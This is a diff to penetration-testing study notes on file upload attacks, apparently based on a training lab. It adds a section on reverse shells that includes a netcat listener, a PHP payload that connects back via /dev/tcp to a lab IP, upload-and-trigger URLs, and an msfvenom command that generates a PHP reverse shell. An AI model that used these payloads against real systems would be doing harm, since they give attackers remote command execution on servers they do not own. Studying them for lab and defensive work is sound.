@@ -9,7 +9,8 @@ This section documents common techniques for identifying and exploiting **file u
 - [File Upload Attacks](#file-upload-attacks)
   - [Overview](#overview)
   - [Basic Exploitation](#basic-exploitation)
-  - [Shells](#shells)
+  - [Web Shells](#web-shells)
+  - [Reverse Shells](#reverse-shells)
 
 ---
 
@@ -105,7 +106,7 @@ At this point, we have successfully achieved remote code execution (RCE) through
 
 Web shells are a common post-exploitation technique used to obtain and maintain remote code execution on a target system. A web shell is typically a script written in the same language as the back-end application and executed through a web-accessible endpoint.
 
-A comprehensive collection of web shells for various programming languages is available in **SecLists**:
+A comprehensive collection of web shells for various programming languages is available at **SecLists**:
 
 - https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
 
@@ -156,7 +157,7 @@ In addition to minimal one-liner shells, more advanced web shells provide a semi
 
 - https://github.com/Arrexel/phpbash
 
-For phpbash to function correctly, the following conditions must be met:
+For `phpbash` to function correctly, the following conditions must be met:
 
 - JavaScript must be enabled in the client browser
 - The target server must allow execution of the PHP `shell_exec()` function
@@ -174,3 +175,73 @@ Interactive web shells like `phpbash` can significantly improve usability during
 ---
 
 ## Reverse Shells
+
+Web shells are not always reliable. In some cases, web application firewalls (WAFs), restrictive PHP configurations, or disabled system functions may prevent web shell execution. In these situations, deploying a reverse shell is often a more effective approach.
+
+A reverse shell is initiated from the target system back to the attacker. Because the outbound connection originates from the server, it is less likely to be blocked by firewalls or network filtering mechanisms.
+
+Before triggering a reverse shell, a listener must be started on the attacking machine. A common choice is `netcat`:
+
+```bash
+nc -lvnp 4444
+```
+
+This listener will wait for an incoming connection from the target.
+
+If the back-end language is PHP, a simple reverse shell can be used. The following payload connects back to the attacker at `10.10.14.137` on port `4444`:
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.137/4444 0>&1'");
+?>
+```
+
+Save the payload as `rev.php` and upload it to the vulnerable application. Once uploaded, navigate to the file in your browser:
+
+```
+http://94.237.50.221:56396/uploads/rev.php
+```
+
+If successful, the reverse shell will connect back to the listener.
+
+A more robust and widely used reverse shell is provided by `pentestmonkey`:
+
+- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+Download the script and modify the following variables:
+
+- `$ip = 'OUR_IP';`
+- `$port = OUR_PORT;`
+
+![Filtered output](images/reverse-shell.png)
+
+Start a listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Upload the modified PHP file and browse to its location:
+
+```
+http://94.237.50.221:56396/uploads/php-reverse-shell.php
+```
+
+Upon execution, the target should establish a reverse shell connection.
+
+Another option is to generate a reverse shell using `msfvenom`, which supports payloads for many programming languages.
+
+The following example generates a PHP reverse shell:
+
+```bash
+msfvenom -p php/reverse_php LHOST=10.10.14.189 LPORT=8001 -f raw > reverse.php
+```
+
+Upload the generated file and visit the upload location to execute it:
+
+```
+http://94.237.50.221:56396/uploads/reverse.php
+```
+
+If successful, a reverse shell will connect back to the specified listener.
+---
